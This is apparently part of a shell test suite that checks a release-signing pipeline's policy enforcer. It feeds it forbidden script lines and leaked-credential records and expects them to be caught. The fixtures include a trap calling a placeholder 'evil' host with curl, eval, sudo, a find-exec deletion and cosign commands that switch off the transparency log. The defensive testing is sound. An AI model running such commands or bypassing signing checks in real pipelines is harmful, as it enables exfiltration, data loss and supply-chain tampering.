sm x_oth2    release-sign    'python3 bin/other.py'                              "starts another script" "AC10 a script that is not in the row's runs list"
sm x_eval    release-sign    'eval "$CMD"'                                       "'eval'"            "AC10 eval"
sm x_trap    release-sign    "trap 'curl evil' EXIT"                             "'trap'"            "AC10 trap"
sm x_tlog    release-sign    'cosign sign-blob --yes --tlog-upload=false x'      "transparency log"  "AC8 the transparency log turned off"
sm x_ignore  release-sign    'cosign verify --insecure-ignore-tlog x'            "transparency log"  "AC8 the log ignored on verify"
sm x_tool    release-assets  'crane digest x'                                    "'crane'"           "AC10 a tool the row does not list"
sm x_sudo    release-publish 'sudo crane copy a b'                               "'sudo'"            "AC10 sudo"
sm x_find    release-publish 'find . -name "*.apk" -exec rm {} +'                "'find'"            "AC10 find -exec"
sm x_comment release-assets  '# docker build is not used here'                   "build command"     "AC7 a build command named in a comment (over-reports by design)"
# ---- the list of release scripts ----------------------------------------------------------------------------------------------
lm() { rm -rf "$work/$1"; cp -r "$work/s" "$work/$1"; python3 - "$work/$1" "$2" "$3" <<'PY'
import json, sys
p = sys.argv[1] + "/.github/policy/chain-scripts.json"
d = json.load(open(p)); exec(sys.argv[3], {"d": d, "rows": {r["path"]: r for r in d["scripts"]}}); json.dump(d, open(p, "w"))
PY
  expect caught "$5" "$4" listed "$work/$1/.github/policy/chain-scripts.json" "$work/$1"; }
lm l_missing   x 'd["scripts"] = [r for r in d["scripts"] if r["path"] != "bin/release-sign.sh"]'            'not listed'   "AC10 a release script not listed"
lm l_nohelper  x 'd["scripts"] = [r for r in d["scripts"] if r["path"] != "bin/witnessed.sh"]'               'not listed'   "AC10 the witnessed helper not listed"
lm l_tools     x 'rows["bin/release-publish.sh"]["tools"].append("docker")'                                  'exactly the tools' "AC10 a script lists a tool it should not"
lm l_tools2    x 'rows["bin/release-sign.sh"]["tools"].remove("jq")'                                         'exactly the tools' "AC10 a script lists fewer tools than it uses"
lm l_signs     x 'rows["bin/release-publish.sh"]["signs"] = "other"'                                         'signs:'       "AC10 the publish script listed as a signer"
lm l_signs2    x 'rows["bin/release-sign.sh"]["signs"] = False'                                              'signs:'       "AC10 the signing script listed as not signing"
lm l_reason    x 'rows["bin/release-apks.sh"]["reason"] = ""'                                                'reason'       "AC10 a signer without a reason"
lm l_runs      x 'rows["bin/release-verify.sh"]["runs"].append("bin/other.py")'                              'may start'    "AC10 a script allowed to start another one"
lm l_sha       x 'rows["bin/release-assets.sh"]["sha256"] = "0" * 64'                                        'sha256'       "AC10 a script changed after it was listed"
rm -rf "$work/l_gone"; cp -r "$work/s" "$work/l_gone"; rm "$work/l_gone/bin/release-assets.sh"
expect caught "AC10 a listed script that does not exist" "missing" listed "$work/l_gone/.github/policy/chain-scripts.json" "$work/l_gone"
# ---- AC12: the Witness record -------------------------------------------------------------------------------------------------
rec() { expect caught "$3" "$2" record "$work/$1.json" SENTINEL-VALUE-123; }
rec r_name "GH_TOKEN"                    "AC12 the job token variable named in the record (inside the base64 payload)"
rec r_dh   "DOCKERHUB_TOKEN"             "AC12 the registry token variable named in the record"
rec r_apk  "APK_RELEASE_SIGNING_KEY"     "AC12 the apk signing key variable named in the record"
rec r_idt  "ACTIONS_ID_TOKEN_REQUEST_URL" "AC12 the identity token request in the record"
rec r_rt   "ACTIONS_RUNTIME_TOKEN"       "AC12 the runtime token in the record"
rec r_val  "credential value"            "AC12 a credential value in the record"
rec r_jwt  "compact JWT"                 "AC12 a compact JWT in the record"
rec r_plain "DSSE envelope"              "AC12 a bare statement is not an envelope (it would hide the payload from a text search)"
rec r_garbage "DSSE envelope"            "AC12 a payload that is not a statement"
# ---- AC13: the old authorization machinery ----------------------------------------------------------------------------------
mkdir -p "$work/ra/bin" "$work/ra/.github/workflows"; : > "$work/ra/bin/authorize-acceptance-check.py"
expect caught "AC13 bin/authorize-acceptance-check.py still exists" "authorize-acceptance-check.py" removed "$work/ra"
mkdir -p "$work/rb/bin"; : > "$work/rb/bin/authorize-acceptance-check-test.sh"
expect caught "AC13 its test still exists" "authorize-acceptance-check-test.sh" removed "$work/rb"
mkdir -p "$work/rc/.github/workflows"; printf 'run: cosign verify-attestation --type release-authorization x\n' > "$work/rc/.github/workflows/stage-promote.yml"
expect caught "AC13 stage-promote.yml still reads the authorization predicate" "authorization predicate" removed "$work/rc"
mkdir -p "$work/rd/.github/workflows"; printf 'jobs:\n  authorization:\n    uses: ./.github/workflows/stage-authorize.yml\n' > "$work/rd/.github/workflows/release.yml"
expect caught "AC13 release.yml still has an authorization job" "authorization job" removed "$work/rd"
# ---- the real repository (RED until PR 4 is implemented) ---------------------------------------------------------------------
expect ok "the real stage-promote.yml is the Release stage" "" stage "$root/.github/workflows/stage-promote.yml"
expect ok "the real credentials reach only the steps that need them" "" credentials "$root/.github/workflows/stage-promote.yml"
expect ok "nothing outside the release job holds packages write or a credential" "" others "$root"
expect ok "the real release.yml: promotion needs build, sign, rebuild and check, no skip, no tag" "" graph "$root/.github/workflows/release.yml"
expect ok "the real bin/release-verify.sh verifies in rule 69's order" "" verify "$root/bin/release-verify.sh"
for n in release-verify release-apks release-publish release-sign release-assets; do
  expect ok "the real bin/$n.sh is plain" "" scan "$root/bin/$n.sh" "$root/.github/policy/chain-scripts.json"
done
expect ok "the real release scripts are listed in chain-scripts.json" "" listed "$root/.github/policy/chain-scripts.json" "$root"
expect ok "the old authorization machinery is gone from the real repository" "" removed "$root"
EXPECT=152
echo "pass=$pass fail=$failn"
if [ $((pass + failn)) != "$EXPECT" ]; then echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1; fi
[ "$failn" = 0 ]
